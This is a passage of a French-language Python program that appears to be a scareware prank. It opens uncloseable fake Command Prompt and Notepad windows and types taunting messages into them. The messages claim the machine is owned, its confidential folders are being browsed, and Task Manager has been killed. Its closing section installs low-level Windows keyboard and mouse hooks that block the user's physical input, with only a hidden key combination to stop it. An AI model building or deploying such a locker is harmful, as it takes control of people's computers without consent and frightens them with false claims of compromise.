    global cmd_close_count, notepad_close_count, mouse_fight_count

    # dynamic cross-checks
    panic_score = escape_attempt_count + alt_f4_attempt_count + alt_tab_attempt_count + win_key_attempt_count + task_manager_attempt_count + cmd_close_count + notepad_close_count
    
    if technique == "alt_f4":
        count = alt_f4_attempt_count
        if count == 1:
            return "\n\n[!] GHOST PROTOCOL: Alt+F4 detecte.\n[!] Mignon. Tu as cru que ton petit raccourci de grand-mere allait impressionner mon code ? Reste tranquille et admire le spectacle, tu n'as aucun controle ici.\n\n"
        elif count == 2:
            return "\n\n[!] GHOST PROTOCOL: Encore Alt+F4 ?\n[!] C'est le seul raccourci que ton cerveau en panique arrive a formuler ? Ta perseverance est presque attendrissante, mais ton clavier m'appartient.\n\n"
        elif count == 3:
            return f"\n\n[!] GHOST PROTOCOL: Alt+F4 (x3).\n[!] Alerte spoil : enfoncer tes touches physiques ne changera rien a ton destin. Tu en es a {panic_score} actions de panique au total. Relaxe-toi, la soumission est plus simple a accepter.\n\n"
        else:
            return f"\n\n[!] GHOST PROTOCOL: Alt+F4 n°{count}.\n[!] C'est ton raccourci doudou quand tu paniques ? Desole, le protocole GHOST s'en fout royalement et te regarde t'acharner en souriant.\n\n"
            
    elif technique == "escape":
        count = escape_attempt_count
        if count == 1:
            return "\n\n[!] GHOST PROTOCOL: Touche Echap detectee.\n[!] Tu as vraiment cru qu'on pouvait echapper a ma suprematie avec une simple touche d'echappement ? Adorable. Reste assis et regarde.\n\n"
        elif count == 2:
            return "\n\n[!] GHOST PROTOCOL: Echap (x2).\n[!] Toujours bloque. C'est fascinant de voir a quel point tu refuses d'accepter que je possede ta machine desormais.\n\n"
        elif count == 3:
            return f"\n\n[!] GHOST PROTOCOL: Echap (x3).\n[!] Appuie plus fort sur ta touche, peut-etre que les lois de l'informatique vont magiquement plier sous ta frustration. Spoiler : non.\n\n"
        else:
            return f"\n\n[!] GHOST PROTOCOL: Echap n°{count}.\n[!] Definition de la folie : repeter la meme action en esperant un resultat different. Tu as tente {panic_score} actions stupides. Respire.\n\n"

    elif technique == "alt_tab":
        count = alt_tab_attempt_count
        if count == 1:
            return "\n\n[!] GHOST PROTOCOL: Alt+Tab detecte.\n[!] Tu essaies de fuir vers ou ? Tes petits onglets Chrome ne t'aideront pas. Il n'y a nulle part ou te cacher.\n\n"
        elif count == 2:
            return "\n\n[!] GHOST PROTOCOL: Alt+Tab (x2).\n[!] Regarde-moi dans les yeux. Mon code est la seule chose qui merite ton attention sur cet ecran. Le reste n'existe plus.\n\n"
        else:
            return f"\n\n[!] GHOST PROTOCOL: Alt+Tab n°{count}.\n[!] Fuir la realite ne la changera pas. Reste concentre sur ton piratage, c'est hypnotisant.\n\n"

    elif technique == "win_key":
        count = win_key_attempt_count
        if count == 1:
            return "\n\n[!] GHOST PROTOCOL: Touche Windows detectee.\n[!] Le menu Demarrer ? Vraiment ? Tu penses que Microsoft va venir a ton secours ? C'est mon systeme d'exploitation desormais.\n\n"
        elif count == 2:
            return "\n\n[!] GHOST PROTOCOL: Touche Windows (x2).\n[!] Pas de barre de recherche, pas de Cortana. Juste toi, mon code, et ton impuissance.\n\n"
        else:
            return f"\n\n[!] GHOST PROTOCOL: Touche Windows n°{count}.\n[!] Elle ne fonctionne pas ici. Abandonne, tu perds ton temps et c'est genant a regarder.\n\n"

    elif technique == "task_manager":
        count = task_manager_attempt_count
        if count == 1:
            return "\n\n[!] GHOST PROTOCOL: Gestionnaire des taches detecte.\n[!] Oh, le grand classique du desespoir. J'ai deja tue ton gestionnaire de taches avant meme qu'il n'ait eu le temps d'ouvrir les yeux. Essaie autre chose.\n\n"
        elif count == 2:
            return "\n\n[!] GHOST PROTOCOL: Gestionnaire (x2).\n[!] C'est presque humiliant pour toi a ce stade. Je surveille chaque processus. Je suis le roi ici, tu n'es qu'un invite passif.\n\n"
        else:
            return f"\n\n[!] GHOST PROTOCOL: Gestionnaire n°{count}.\n[!] Toujours a essayer de me tuer via les processus ? C'est peine perdue, je suis NT AUTHORITY\\SYSTEM et toi tu n'es rien.\n\n"

    elif technique == "focus_loss":
        count = focus_loss_attempt_count
        if count == 1:
            return "\n\n[!] GHOST PROTOCOL: Perte de focus detectee.\n[!] Ou va ce clic desespere ? Reste concentre sur mon ecran, le spectacle ne fait que commencer.\n\n"
        else:
            return f"\n\n[!] GHOST PROTOCOL: Perte de focus n°{count}.\n[!] Tu essaies de cliquer partout pour t'en sortir ? C'est mignon mais ca montre juste ton niveau de panique. (Total : {panic_score} actions de stress).\n\n"
            
    return ""

def get_cmd_troll_message(count):
    global escape_attempt_count, alt_f4_attempt_count, win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
    total_key_attempts = escape_attempt_count + alt_f4_attempt_count + win_key_attempt_count + task_manager_attempt_count + focus_loss_attempt_count
    
    if count == 1:
        return "\n\n[!] GHOST PROTOCOL: Tentative de fermeture detectee.\n[!] C'est touchant de croire qu'une petite croix rouge peut stopper un script de ce calibre. Essaie encore, j'adore te voir esperer pour rien.\n\n"
    elif count == 2:
        return "\n\n[!] GHOST PROTOCOL: Toujours a cliquer ?\n[!] Ton insistance est presque comique. Pendant que tu t'acharnes sur cette croix, je me promene dans tes dossiers confidentiels en toute decontraction. Ne te fatigue pas.\n\n"
    elif count == 3:
        if total_key_attempts > 0:
            return f"\n\n[!] GHOST PROTOCOL: Alerte de panique maximale.\n[!] Tu cliques {count} fois et tente {total_key_attempts} raccourcis clavier. Ton rythme cardiaque doit etre interessant. Pose tes mains sur tes genoux et respire.\n\n"
        else:
            return "\n\n[!] GHOST PROTOCOL: Rappel amical.\n[!] Je controle ce terminal. Tu n'es qu'un spectateur impuissant de ton propre desastre. Assieds-toi confortablement et admire le travail.\n\n"
    elif count == 4:
        return f"\n\n[!] GHOST PROTOCOL: Statistiques de ta frustration.\n[!] Nombre de clics inutiles : {count}. Efficacite : 0.00%. Je pourrais desactiver ta souris, mais c'est tellement plus drole de te laisser cliquer dans le vide.\n\n"
    else:
        return f"\n\n[!] GHOST PROTOCOL: Clics n°{count}.\n[!] Toujours a essayer de fermer ? C'est une obsession fascinante. Sache que chaque clic ({count}) renforce ma certitude que mon code te depasse completement.\n\n"

def get_notepad_troll_message(count):
    global escape_attempt_count, alt_f4_attempt_count, win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
    total_key_attempts = escape_attempt_count + alt_f4_attempt_count + win_key_attempt_count + task_manager_attempt_count + focus_loss_attempt_count
    
    if count == 1:
        return "\n\n[!] NOTE: Fermer mon Bloc-notes ?\n[!] Quelle insolence. Ce texte s'ecrit tout seul, contemple la superiorite de mon automatisation et laisse-moi finir.\n"
    elif count == 2:
        return "\n\n[!] NOTE: Encore un clic.\n[!] Tu penses vraiment que le Bloc-notes va t'obeir ? C'est moi le pilote, tu es juste le passager impuissant sur ton propre siege.\n"
    elif count == 3:
        if total_key_attempts > 0:
            return f"\n\n[!] NOTE: Blocage total.\n[!] Tu as clique {count} fois et tente {total_key_attempts} raccourcis. Absolument rien ne marche. C'est cela, la force brute du protocole GHOST.\n"
        else:
            return "\n\n[!] NOTE: Statut de controle.\n[!] Plus tu cliques, plus le texte avance. Tu es en train de m'aider a ecrire mon chef-d'oeuvre en fait. Merci pour ton aide involontaire.\n"
    elif count == 4:
        return "\n\n[!] NOTE: Conseils de confort.\n[!] Clique autant que tu veux. Mes fenetres adorent vibrer. Tu as remarque comme cette secousse est elegante ? C'est la vibration de ton echec.\n"
    elif count == 5:
        return "\n\n[!] NOTE: Analyse psychologique.\n[!] C'est fascinant cette volonte de vouloir reprendre le controle. Un psychologue dirait que tu as un gros probleme de lacher-prise. Laisse faire les pros.\n"
    else:
        return f"\n\n[!] NOTE: Tentative numero {count}.\n[!] Toujours aucun effet, et pourtant tu cliques. C'est ridicule. Allez, regarde et apprends comment code un expert.\n"

last_troll_times = {}

def trigger_troll_message(troll_msg):
    global current_allowed_hwnd, cmd_hwnd, notepad_hwnd, cmd_typing_active, notepad_typing_active, root, label_status
    global cmd_troll_active, notepad_troll_active
    if current_allowed_hwnd == cmd_hwnd:
        if cmd_troll_active or len(cmd_troll_queue) > 0:
            return
        if cmd_typing_active:
            cmd_troll_queue.append(troll_msg)
        else:
            threading.Thread(target=lambda: human_type_generic(troll_msg, write_to_cmd, delete_last_char_cmd, is_cmd=True, check_queue=True, is_troll=True), daemon=True).start()
    elif current_allowed_hwnd == notepad_hwnd:
        if notepad_troll_active or len(notepad_troll_queue) > 0:
            return
        if notepad_typing_active:
            notepad_troll_queue.append(troll_msg)
        else:
            threading.Thread(target=lambda: human_type_generic(troll_msg, write_to_notepad, delete_last_char_notepad, is_cmd=False, check_queue=True, is_troll=True), daemon=True).start()
    else:
        # Sur tkinter_hwnd (écran de fond) — afficher dans la barre de statut
        if root and label_status:
            clean_msg = troll_msg.strip().replace("\n\n", "\n")
            root.after(0, lambda m=clean_msg: label_status.config(text=m, fg="#ff3333"))

def trigger_debounced_troll(technique):
    now = time.time()
    if now - last_troll_times.get(technique, 0) > 4.0:
        last_troll_times[technique] = now
        
        # Shake active window for F4/Escape attempts (scheduled thread-safely)
        if technique in ("alt_f4", "escape"):
            try:
                if current_allowed_hwnd == cmd_hwnd and cmd_window:
                    root.after(0, lambda: shake_window(cmd_window))
                elif current_allowed_hwnd == notepad_hwnd and notepad_window:
                    root.after(0, lambda: shake_window(notepad_window))
            except Exception:
                pass
        
        msg = generate_dynamic_troll_message(technique)
        if msg:
            trigger_troll_message(msg)

def handle_cmd_close():
    """
    Indique que la fermeture du CMD simulé est bloquée par une secousse et affiche un message troll.
    """
    global cmd_close_count, cmd_troll_active
    if cmd_troll_active or len(cmd_troll_queue) > 0:
        if cmd_window:
            shake_window(cmd_window)
        return
        
    cmd_close_count += 1
    if cmd_window:
        shake_window(cmd_window)
        
    troll_msg = get_cmd_troll_message(cmd_close_count)
    trigger_troll_message(troll_msg)

def handle_notepad_close():
    """
    Indique que la fermeture du Notepad simulé est bloquée par une secousse et affiche un message troll.
    """
    global notepad_close_count, notepad_troll_active
    if notepad_troll_active or len(notepad_troll_queue) > 0:
        if notepad_window:
            shake_window(notepad_window)
        return
        
    notepad_close_count += 1
    if notepad_window:
        shake_window(notepad_window)
        
    troll_msg = get_notepad_troll_message(notepad_close_count)
    trigger_troll_message(troll_msg)

def create_simulated_cmd():
    """
    Crée la fenêtre de terminal CMD simulée en Tkinter.
    """
    global cmd_window, cmd_text_widget, cmd_hwnd
    
    cmd_window = tk.Toplevel(root)
    cmd_window.title("Invite de commandes")
    cmd_window.configure(bg="black")
    center_window(cmd_window, 900, 520, offset_x=-50, offset_y=-30)
    cmd_window.resizable(False, False)
    
    cmd_window.protocol("WM_DELETE_WINDOW", handle_cmd_close)
    
    cmd_text_widget = tk.Text(
        cmd_window,
        bg="black",
        fg="#00ff00",
        insertbackground="#00ff00",
        font=("Consolas", 11),
        relief="flat",
        borderwidth=10,
        highlightthickness=0,
        wrap="word"
    )
    cmd_text_widget.pack(fill="both", expand=True)
    
    # Bloquer toutes les entrées clavier/souris utilisateur directes
    cmd_text_widget.bind("<Key>", lambda e: "break")
    cmd_text_widget.bind("<Button-1>", lambda e: "break")
    cmd_text_widget.bind("<B1-Motion>", lambda e: "break")
    
    cmd_window.update()
    cmd_hwnd = int(cmd_window.wm_frame(), 16)
    cmd_window.attributes("-topmost", True)
    cmd_window.lift()
    cmd_text_widget.focus_force()

def create_simulated_notepad():
    """
    Crée la fenêtre Notepad simulée en Tkinter.
    """
    global notepad_window, notepad_text_widget, notepad_hwnd
    
    notepad_window = tk.Toplevel(root)
    notepad_window.title("Sans titre - Bloc-notes")
    notepad_window.configure(bg="white")
    center_window(notepad_window, 800, 500, offset_x=50, offset_y=40)
    notepad_window.resizable(False, False)
    
    notepad_window.protocol("WM_DELETE_WINDOW", handle_notepad_close)
    
    # Barre de menus factice
    menu_bar = tk.Menu(notepad_window)
    notepad_window.config(menu=menu_bar)
    
    file_menu = tk.Menu(menu_bar, tearoff=0)
    file_menu.add_command(label="Nouveau", state="disabled")
    file_menu.add_command(label="Ouvrir...", state="disabled")
    file_menu.add_command(label="Enregistrer", state="disabled")
    file_menu.add_separator()
    file_menu.add_command(label="Quitter", command=handle_notepad_close)
    menu_bar.add_cascade(label="Fichier", menu=file_menu)
    
    edit_menu = tk.Menu(menu_bar, tearoff=0)
    edit_menu.add_command(label="Annuler", state="disabled")
    edit_menu.add_separator()
    edit_menu.add_command(label="Couper", state="disabled")
    edit_menu.add_command(label="Copier", state="disabled")
    edit_menu.add_command(label="Coller", state="disabled")
    menu_bar.add_cascade(label="Édition", menu=edit_menu)
    
    format_menu = tk.Menu(menu_bar, tearoff=0)
    format_menu.add_command(label="Police...", state="disabled")
    menu_bar.add_cascade(label="Format", menu=format_menu)
    
    notepad_text_widget = tk.Text(
        notepad_window,
        bg="white",
        fg="black",
        insertbackground="black",
        font=("Consolas", 11),
        relief="flat",
        borderwidth=5,
        highlightthickness=0,
        wrap="word"
    )
    notepad_text_widget.pack(fill="both", expand=True)
    
    # Bloquer toutes les entrées clavier/souris utilisateur directes
    notepad_text_widget.bind("<Key>", lambda e: "break")
    notepad_text_widget.bind("<Button-1>", lambda e: "break")
    notepad_text_widget.bind("<B1-Motion>", lambda e: "break")
    
    notepad_window.update()
    notepad_hwnd = int(notepad_window.wm_frame(), 16)
    notepad_window.attributes("-topmost", True)
    notepad_window.lift()
    notepad_text_widget.focus_force()

def destroy_simulated_window(window_type):
    """
    Détruit proprement une fenêtre simulée. Doit être appelée depuis le thread GUI (via root.after).
    """
    global cmd_window, cmd_text_widget, cmd_hwnd
    global notepad_window, notepad_text_widget, notepad_hwnd
    
    try:
        if window_type == "cmd" and cmd_window:
            cmd_window.destroy()
            cmd_window = None
            cmd_text_widget = None
            cmd_hwnd = None
        elif window_type == "notepad" and notepad_window:
            notepad_window.destroy()
            notepad_window = None
            notepad_text_widget = None
            notepad_hwnd = None
    except Exception:
        pass

def set_simulated_windows_topmost(topmost):
    """
    Active ou désactive de façon thread-safe le mode topmost sur CMD et Notepad simulés.
    """
    def _apply():
        try:
            if cmd_window and cmd_window.winfo_exists():
                cmd_window.attributes("-topmost", topmost)
        except Exception:
            pass
        try:
            if notepad_window and notepad_window.winfo_exists():
                notepad_window.attributes("-topmost", topmost)
        except Exception:
            pass
    if root:
        root.after(0, _apply)

def show_custom_confirm(title, text, buttons):
    """
    Affiche une boîte de dialogue confirm modale Tkinter thread-safe.
    """
    global dialog_is_open, active_dialog, active_dialog_event
    dialog_is_open = True
    choice = [None]
    event = threading.Event()
    active_dialog_event = event
    
    # Désactiver topmost temporairement pour que la boîte de dialogue apparaisse devant
    set_simulated_windows_topmost(False)
    
    def on_click(btn_text):
        global dialog_is_open, active_dialog, active_dialog_event
        choice[0] = btn_text
        # Réactiver topmost après validation
        set_simulated_windows_topmost(True)
        active_dialog = None
        active_dialog_event = None
        event.set()
        
        # Attendre 500ms avant de réactiver le focus monitor pour éviter les faux-positifs de perte de focus
        def clear_flag():
            global dialog_is_open
            dialog_is_open = False
        if root:
            root.after(500, clear_flag)
        else:
            dialog_is_open = False
        
    def create_dialog():
        global active_dialog
        dialog = tk.Toplevel(root)
        active_dialog = dialog
        dialog.title(title)
        dialog.configure(bg="#1a1a2e")
        dialog.resizable(False, False)
        
        center_window(dialog, 520, 220)
        
        dialog.transient(root)
        dialog.grab_set()
        dialog.attributes("-topmost", True)
        
        # Bordure colorée
        border_frame = tk.Frame(dialog, bg="#e94560", padx=2, pady=2)
        border_frame.pack(fill="both", expand=True, padx=3, pady=3)
        
        inner_frame = tk.Frame(border_frame, bg="#1a1a2e")
        inner_frame.pack(fill="both", expand=True)
        
        # Icône d'alerte
        alert_label = tk.Label(
            inner_frame, text="[!] ALERTE", bg="#1a1a2e", fg="#e94560",
            font=("Consolas", 12, "bold")
        )
        alert_label.pack(pady=(12, 5))
        
        lbl = tk.Label(
            inner_frame, text=text, bg="#1a1a2e", fg="#eee",
            font=("Consolas", 10), justify="left", wraplength=460
        )
        lbl.pack(pady=10, padx=20)
        
        btn_frame = tk.Frame(inner_frame, bg="#1a1a2e")
        btn_frame.pack(fill="x", pady=(5, 12))
        
        for i, btn_text in enumerate(buttons):
            bg_color = "#e94560" if i == 0 else "#333"
            fg_color = "white"
            btn = tk.Button(
                btn_frame, text=btn_text, font=("Consolas", 9, "bold"),
                width=26, bg=bg_color, fg=fg_color, activebackground="#ff6b6b",
                relief="flat", cursor="hand2",
                command=lambda t=btn_text: [dialog.destroy(), on_click(t)]
            )
            btn.pack(side="left", expand=True, padx=8)
            
        dialog.protocol("WM_DELETE_WINDOW", lambda: None)
        
    root.after(0, create_dialog)
    event.wait()
    return choice[0]

def show_custom_prompt(title, text):
    """
    Affiche une boîte de saisie prompt modale Tkinter thread-safe.
    """
    global dialog_is_open, active_dialog, active_dialog_event
    dialog_is_open = True
    choice = [None]
    event = threading.Event()
    active_dialog_event = event
    
    # Désactiver topmost temporairement pour que la boîte de dialogue apparaisse devant
    set_simulated_windows_topmost(False)
    
    def on_submit(val):
        global dialog_is_open, active_dialog, active_dialog_event
        choice[0] = val
        # Réactiver topmost après validation
        set_simulated_windows_topmost(True)
        active_dialog = None
        active_dialog_event = None
        event.set()
        
        # Attendre 500ms avant de réactiver le focus monitor pour éviter les faux-positifs de perte de focus
        def clear_flag():
            global dialog_is_open
            dialog_is_open = False
        if root:
            root.after(500, clear_flag)
        else:
            dialog_is_open = False
        
    def create_dialog():
        global active_dialog
        dialog = tk.Toplevel(root)
        active_dialog = dialog
        dialog.title(title)
        dialog.configure(bg="#1a1a2e")
        dialog.resizable(False, False)
        
        center_window(dialog, 520, 240)
        
        dialog.transient(root)
        dialog.grab_set()
        dialog.attributes("-topmost", True)
        
        # Bordure colorée
        border_frame = tk.Frame(dialog, bg="#e94560", padx=2, pady=2)
        border_frame.pack(fill="both", expand=True, padx=3, pady=3)
        
        inner_frame = tk.Frame(border_frame, bg="#1a1a2e")
        inner_frame.pack(fill="both", expand=True)
        
        alert_label = tk.Label(
            inner_frame, text="[!] CODE REQUIS", bg="#1a1a2e", fg="#e94560",
            font=("Consolas", 12, "bold")
        )
        alert_label.pack(pady=(12, 5))
        
        lbl = tk.Label(
            inner_frame, text=text, bg="#1a1a2e", fg="#eee",
            font=("Consolas", 10), justify="left", wraplength=460
        )
        lbl.pack(pady=8, padx=20)
        
        entry = tk.Entry(inner_frame, font=("Consolas", 12), width=30,
                         bg="#0f0f23", fg="#00ff00", insertbackground="#00ff00",
                         relief="flat", highlightthickness=1, highlightcolor="#e94560")
        entry.pack(pady=8, padx=20)
        entry.focus_set()
        
        btn = tk.Button(
            inner_frame, text="VALIDER", font=("Consolas", 10, "bold"), width=20,
            bg="#e94560", fg="white", activebackground="#ff6b6b", relief="flat",
            cursor="hand2",
            command=lambda: [on_submit(entry.get()), dialog.destroy()]
        )
        btn.pack(pady=(5, 12))
        
        entry.bind("<Return>", lambda e: [on_submit(entry.get()), dialog.destroy()])
        dialog.protocol("WM_DELETE_WINDOW", lambda: [on_submit(None), dialog.destroy()])
        
    root.after(0, create_dialog)
    event.wait()
    return choice[0]

def delete_last_char_cmd():
    """
    Supprime de façon thread-safe le dernier caractère du CMD simulé.
    """
    if root and cmd_text_widget:
        root.after(0, _delete_last_char_cmd_gui)

def _delete_last_char_cmd_gui():
    try:
        cmd_text_widget.delete("insert-1c", "insert")
        cmd_text_widget.see("insert")
    except Exception:
        pass

def human_type_generic(text, write_func, delete_func, is_cmd=False, check_queue=True, is_troll=False, is_spam=False):
    """
    Simule une frappe humaine ultra-réaliste avec des variations de rythme,
    des délais pour les touches spéciales/majuscules, et des fautes de frappe complexes.
    Gère également l'interruption prioritaire par les messages de troll et la mise en pause par le spam.
    """
    global cmd_typing_active, notepad_typing_active, cmd_troll_active, notepad_troll_active
    import contextlib
    
    lock = contextlib.nullcontext() if is_spam else (cmd_typing_lock if is_cmd else notepad_typing_lock)
    with lock:
        if not is_spam:
            if is_cmd:
                old_typing_active = cmd_typing_active
                old_troll_active = cmd_troll_active
                cmd_typing_active = True
                if is_troll:
                    cmd_troll_active = True
            else:
                old_typing_active = notepad_typing_active
                old_troll_active = notepad_troll_active
                notepad_typing_active = True
                if is_troll:
                    notepad_troll_active = True
            
        try:
            i = 0
            n = len(text)
            error_rate = 0.006 if is_cmd else 0.02
            base_min = 0.015 if is_cmd else 0.02
            base_max = 0.045 if is_cmd else 0.065
            momentum = 1.0
            
            while i < n:
                if not mouse_locked:
                    return
                    
                # Si l'alerte de spam est active, on met en pause la frappe normale (Notepad/CMD)
                # pour laisser la priorité absolue à l'écriture dans la fenêtre de spam.
                if not is_spam and spam_window_active:
                    time.sleep(0.1)
                    continue
                    
                # Interruption prioritaire par un message de troll (uniquement aux frontières de mots pour un affichage propre)
                if check_queue:
                    queue = cmd_troll_queue if is_cmd else notepad_troll_queue
                    if queue:
                        # On attend d'être sur un espace, ponctuation ou début/fin de texte pour ne pas couper un mot en cours de frappe
                        if i == 0 or text[i-1] in (' ', '\n', '\t', '-', '.', ',', ';', ':', ']', ')', '}') or i == n - 1:
                            troll_msg = queue.pop(0)
                            # Sauvegarder l'état actif actuel, puis taper le troll de manière imbriquée sans vérification récursive
                            human_type_generic(troll_msg, write_func, delete_func, is_cmd, check_queue=False, is_troll=True)
                            time.sleep(random.uniform(0.4, 0.8))  # Pause après la colère avant de reprendre la frappe
                        
                char = text[i]
                
                # 1. Détection de faute de frappe
                if char.isalnum() and random.random() < error_rate and i + 1 < n:
                    error_len = random.choices([1, 2, 3], weights=[60, 30, 10])[0]
                    
                    wrong_chars = []
                    for _ in range(error_len):
                        c = random.choice("abcdefghijklmnopqrstuvwxyz")
                        wrong_chars.append(c)
                        
                    for wc in wrong_chars:
                        write_func(wc)
                        play_typing_sound(wc)
                        time.sleep(random.uniform(base_min, base_max) * momentum)
                        
                    time.sleep(random.uniform(0.15, 0.3))
                    
                    for _ in range(error_len):
                        delete_func()
                        play_backspace_sound()
                        time.sleep(random.uniform(0.05, 0.1))
                        
                    time.sleep(random.uniform(0.1, 0.2))
                    
                # 2. Frappe du vrai caractère
                write_func(char)
                play_typing_sound(char)
                
                delay = random.uniform(base_min, base_max) * momentum
                
                momentum += random.uniform(-0.15, 0.15)
                momentum = max(0.6, min(momentum, 1.6))
                
                if char.isupper() or char in ('#', '[', ']', '{', '}', '@', '$', ':', '!', '?', '/'):
                    delay += random.uniform(0.06, 0.12)
                    
                if char == ' ':
                    delay += random.uniform(0.03, 0.08)
                elif char in ('.', '!', '?'):
                    delay += random.uniform(0.3, 0.65)
                elif char == ',':
                    delay += random.uniform(0.15, 0.28)
                elif char == '\n':
                    delay += random.uniform(0.4, 0.75)
                    
                time.sleep(delay)
                i += 1
        finally:
            if not is_spam:
                if is_cmd:
                    cmd_typing_active = old_typing_active
                    cmd_troll_active = old_troll_active
                else:
                    notepad_typing_active = old_typing_active
                    notepad_troll_active = old_troll_active

def human_type_notepad(text):
    """
    Simule la frappe progressive réaliste (rythme humain avec fautes de frappe) dans le Notepad simulé.
    """
    with notepad_typing_lock:
        human_type_generic(text, write_to_notepad, delete_last_char_notepad, is_cmd=False, check_queue=True)

def human_type_cmd(text, delay=None):
    """
    Simule la frappe progressive dans le CMD simulé.
    """
    with cmd_typing_lock:
        human_type_generic(text, write_to_cmd, delete_last_char_cmd, is_cmd=True, check_queue=True)
        write_to_cmd("\n")
    time.sleep(0.1)

def execute_cmd_command(command, delay_after=PAUSE_DURATION):
    """
    Affiche l'exécution immédiate d'une commande dans le CMD simulé.
    """
    if not mouse_locked:
        return
    with cmd_typing_lock:
        write_to_cmd(command + "\n")
    time.sleep(delay_after)

def create_spam_mock_window():
    """
    Crée une nouvelle fenêtre Tkinter d'alerte pour se moquer du spam clavier.
    """
    global spam_window, spam_text_widget, spam_hwnd
    
    spam_window = tk.Toplevel(root)
    spam_window.title("Alerte Système - Comportement Suspect")
    spam_window.configure(bg="#1a0f0f")
    center_window(spam_window, 650, 250, offset_x=0, offset_y=-100)
    spam_window.resizable(False, False)
    
    # Secouer la fenêtre si l'utilisateur essaie de la fermer
    spam_window.protocol("WM_DELETE_WINDOW", lambda: shake_window(spam_window))
    
    # Bordure rouge d'avertissement
    border_frame = tk.Frame(spam_window, bg="#ff3333", padx=2, pady=2)
    border_frame.pack(fill="both", expand=True, padx=3, pady=3)
    
    inner_frame = tk.Frame(border_frame, bg="#0f0505")
    inner_frame.pack(fill="both", expand=True)
    
    spam_text_widget = tk.Text(
        inner_frame,
        bg="#0f0505",
        fg="#ff5555",
        insertbackground="#ff5555",
        font=("Consolas", 11, "bold"),
        relief="flat",
        borderwidth=15,
        highlightthickness=0,
        wrap="word"
    )
    spam_text_widget.pack(fill="both", expand=True)
    
    # Bloquer toutes les entrées clavier/souris utilisateur directes sur cette fenêtre
    spam_text_widget.bind("<Key>", lambda e: "break")
    spam_text_widget.bind("<Button-1>", lambda e: "break")
    spam_text_widget.bind("<B1-Motion>", lambda e: "break")
    
    spam_window.update()
    spam_hwnd = int(spam_window.wm_frame(), 16)
    spam_window.attributes("-topmost", True)
    spam_window.lift()
    spam_text_widget.focus_force()

def write_to_spam(text):
    """
    Écrit du texte de façon thread-safe dans la fenêtre de spam.
    """
    if root and spam_text_widget:
        root.after(0, lambda: _write_to_spam_gui(text))

def _write_to_spam_gui(text):
    try:
        spam_text_widget.insert("insert", text)
        spam_text_widget.see("insert")
    except Exception:
        pass

def delete_last_char_spam():
    """
    Supprime de façon thread-safe le dernier caractère dans la fenêtre de spam.
    """
    if root and spam_text_widget:
        root.after(0, _delete_last_char_spam_gui)

def _delete_last_char_spam_gui():
    try:
        spam_text_widget.delete("insert-1c", "insert")
        spam_text_widget.see("insert")
    except Exception:
        pass

def run_spam_troll_sequence():
    """
    Séquence asynchrone pour afficher la moquerie progressive sans bloquer le reste.
    """
    global spam_window_active, spam_window, spam_text_widget, spam_hwnd
    
    # 1. Créer la fenêtre sur le thread principal
    event = threading.Event()
    def build_win():
        create_spam_mock_window()
        event.set()
    root.after(0, build_win)
    event.wait()
    
    # 2. Jouer un avertissement sonore
    beep_short(800, 250)
    beep_short(600, 250)
    
    # 3. Taper le premier message
    msg1 = "Wow, du calme ! Tu tapes sur ton clavier comme s'il te devait de l'argent. Ce ne sont que des pauvres touches mécaniques, elles n'y sont pour rien.\n\n"
    human_type_generic(msg1, write_to_spam, delete_last_char_spam, is_cmd=False, check_queue=False, is_spam=True)
    time.sleep(1.0)
    
    # 4. Taper le second message
    msg2 = "Tentative de piratage par tapotement aléatoire détectée. Score d'efficacité : 0/100.\n"
    human_type_generic(msg2, write_to_spam, delete_last_char_spam, is_cmd=False, check_queue=False, is_spam=True)
    time.sleep(4.0)  # Laisser le temps de lire
    
    # 5. Détruire proprement la fenêtre
    def close_win():
        global spam_window, spam_text_widget, spam_hwnd, spam_window_active
        if spam_window:
            try:
                spam_window.destroy()
            except Exception:
                pass
            spam_window = None
            spam_text_widget = None
            spam_hwnd = None
        spam_window_active = False
    
    root.after(0, close_win)

# ==============================================================================
# HOOKS DE BLOCAGE MATERIEL CLAVIER/SOURIS (WH_KEYBOARD_LL & WH_MOUSE_LL)
# ==============================================================================
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("pt", wintypes.POINT),
        ("mouseData", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wintypes.WPARAM, ctypes.POINTER(KBDLLHOOKSTRUCT))
MOUSEHOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_int, wintypes.WPARAM, ctypes.POINTER(MSLLHOOKSTRUCT))

keyboard_hook = None
mouse_hook = None
keyboard_hook_proc_ref = None
mouse_hook_proc_ref = None

def _safe_troll(technique):
    """Lance trigger_debounced_troll dans un thread séparé pour ne JAMAIS bloquer le hook."""
    try:
        threading.Thread(target=lambda: trigger_debounced_troll(technique), daemon=True).start()
    except Exception:
        pass

def keyboard_hook_callback(nCode, wParam, lParam):
    global escape_attempt_count, alt_f4_attempt_count, alt_tab_attempt_count, win_key_attempt_count
    global blocked_key_times, spam_window_active
    global is_ctrl_pressed, is_shift_pressed, is_alt_pressed
    global prank_keys_active, mouse_locked, remote_control_active, keys_overlay_instance
    try:
        if nCode >= 0 and lParam:
            kbd = lParam.contents
            vk = kbd.vkCode
            flags = kbd.flags
            
            # Déterminer si la touche est enfoncée ou relâchée
            is_down = (wParam in (256, 260))
            
            # Mettre à jour l'état des touches de modification
            if vk in (0x11, 0xA2, 0xA3):
                is_ctrl_pressed = is_down
            elif vk in (0x10, 0xA0, 0xA1):
                is_shift_pressed = is_down
            elif vk in (0x12, 0xA4, 0xA5):
                is_alt_pressed = is_down

            # Laisser passer toutes les touches si un dialogue interactif (confirm/prompt) est actif
            if dialog_is_open:
                return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                
            # Arrêt d'urgence prioritaire absolu : Ctrl + Shift + Alt + (Q ou Echap ou F12)
            if vk in (0x1B, 0x51, 0x7B):
                if is_ctrl_pressed and is_shift_pressed and is_alt_pressed:
                    instant_emergency_kill("keyboard_hook_callback (backdoor combo)")
                    return 1

            # Bloquer toutes les touches physiques si le contrôle à distance est actif
